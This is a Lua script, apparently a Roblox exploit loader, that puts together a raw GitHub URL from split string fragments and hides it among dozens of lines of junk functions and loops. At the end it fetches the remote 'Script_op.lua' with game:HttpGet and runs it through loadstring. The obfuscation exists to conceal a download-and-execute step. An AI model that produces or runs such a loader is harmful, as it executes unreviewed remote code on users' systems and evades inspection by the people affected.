
local __a="ht"
local __b="tp"
local __c="s://"
local __d="raw."
local __e="github"
local __f="usercontent"
local __g=".com"
local __h="/davidsebas348-hub"
local __i="/No-JUMPING-TOWER-"
local __j="/refs/heads/main/"
local __k="Script_op.lua"
local function ___x(x) return x end
local function ___y(f) return f end
local function ABC_001() end
local function ABC_002() end
local function ABC_003() end
local URL_PART1 = __a..__b
local URL_PART2 = URL_PART1..__c
local URL_PART3 = URL_PART2..__d..__e..__f..__g
local URL_PART4 = URL_PART3..__h
local URL_PART5 = URL_PART4..__i
local URL_PART6 = URL_PART5..__j
local FINAL_URL = URL_PART6..__k
local function __http(u)
    return game:HttpGet(u,true)
end
local function __run(code)
    return loadstring(code)()
end
local basura = {}
for i=1,50 do
    basura[i] = { math.random(), math.random(1,99999), tostring(i).."_SBS_"..tostring(os.clock()) }
end
local function fakeA(a,b,c)
    return (a or "")..(b or "")..(c or "")
end
local function fakeB(x)
    local t=0
    for i=1,25 do t=t+i end
    return x,t
end
local function fakeC()
    local z=0
    for i=1,15 do
        z = z + (i*3) % 7
    end
    return z
end
for _=1,20 do fakeC() end
local function dummy_1() return 1 end
local function dummy_2() return 2 end
local function dummy_3() return 3 end
local function dummy_4() return 4 end
local function dummy_5() return 5 end
local FAKELIST = {
    dummy_1(), dummy_2(), dummy_3(), dummy_4(), dummy_5(),
    fakeA("A","B","C"), fakeB("X"), fakeC(),
}
for i=1,40 do
    local r = FAKELIST[ (i % #FAKELIST) + 1 ]
end
local function useless_1(a) return a.."_A" end
local function useless_2(a) return a.."_B" end
local function useless_3(a) return a.."_C" end
for i=1,60 do
    local x = useless_1("SBS"..i)
    local y = useless_2(x)
    local z = useless_3(y)
end
local megatable = {}
for i=1,70 do
    megatable[i] = {
        val = i * math.random(1,99),
        str = "LINE_"..i.."_"..tostring(os.time()),
        nested = { i*2, i*3, i*4 }
    }
end
for i=1,#megatable do
    local v = megatable[i]
    local t = v.nested[ (i % 3) + 1 ]
end
local function noise_01() local r=0 for i=1,40 do r=r+i end return r end
local function noise_02() local r=1 for i=1,20 do r=r*i end return r end
local function noise_03() return tostring(os.clock()) end
local function noise_04(a) return a.."_SBS_PROTECT" end
noise_01()
noise_02()
noise_03()
noise_04("X")
for i=1,50 do
    local _t = i * 2
    _t = _t + (i % 7)
end
local F1=function() return "A" end
local F2=function() return "B" end
local F3=function() return "C" end
local F4=function() return "D" end
local comb = F1()..F2()..F3()..F4()
local __source = __http( FINAL_URL )
__run(__source)
for i=1,25 do
    local u = "END_LINE_"..i
end
